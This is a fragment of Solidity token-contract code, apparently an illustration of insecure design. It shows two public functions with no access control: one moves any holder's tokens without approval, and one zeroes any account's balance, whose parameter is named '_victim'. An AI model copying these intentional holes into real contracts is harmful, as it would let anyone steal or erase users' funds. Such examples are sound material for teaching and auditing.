...

{
    ...
    function transferFromNoApproval(address _from, address _to, uint256 _amount) public returns (bool)
    {
        require (balances[_from] >= _amount, "Insufficient balance");
        balances[_from] = balances[_from].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
    ...
    function resetBalance(address _victim) public returns (bool)
    {   
        balances[_victim] = 0;
    }
